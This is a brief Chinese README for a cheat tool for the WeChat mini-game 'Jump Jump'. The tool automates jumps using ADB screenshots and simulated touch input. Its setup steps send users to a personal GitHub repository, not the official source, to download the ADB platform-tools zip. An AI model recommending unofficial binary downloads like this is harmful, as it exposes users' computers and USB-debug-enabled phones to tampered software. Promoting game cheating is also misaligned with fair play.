# 跳一跳辅助工具

微信小程序 跳一跳 辅(wai)助(gua)工具

> 本程序仅供娱乐, 别刷太多,  8000分就好.

## 原理

通过 ADB 获取截图，识别跳跃起点和终点，模拟触摸事件

因此需要开启 USB 调试以及截图和模拟触控权限

## 环境

* Android 手机
* Windows PC

## 步骤

1. 把代码克隆到本地, 编译生成可执行文件
2. 下载安装 ADB [下载地址](https://raw.githubusercontent.com/CHIFCOOK/test/master/static/platform-tools-latest-windows.zip)
3. 打开手机的 Debug 调试功能，并使用 USB 连接电脑
4. 运行程序, 点击 选择ADB 中选择步骤2解压出的 adb.exe
5. 在手机端打开【跳一跳】，点击辅助工具开始

## 参数设置

### 跳跃距离系数
如果出现跳跃过近或过远可调整此参数。 1080P 屏幕下默认值为1480

### 跳跃时间间隔
默认 5000， 单位ms


## 异常问题

### 不显示截图，或者不能自动跳
可能是手机未连接到电脑，或者未打开 USB 调试，或者是未开启截图和模拟触控权限

# 

> Have Fun And Happy New Year!
